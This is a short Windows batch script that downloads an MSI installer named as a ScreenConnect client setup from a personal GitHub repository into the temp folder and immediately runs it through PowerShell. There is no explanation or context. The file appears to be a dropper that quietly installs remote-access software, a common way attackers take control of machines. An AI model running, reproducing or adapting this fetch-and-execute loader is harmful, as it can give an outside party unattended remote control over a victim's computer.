@echo off

set files='https://github.com/dm-ship-it-dev/my-files/raw/refs/heads/main/ScreenConnect.ClientSetup(2).msi'
powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"



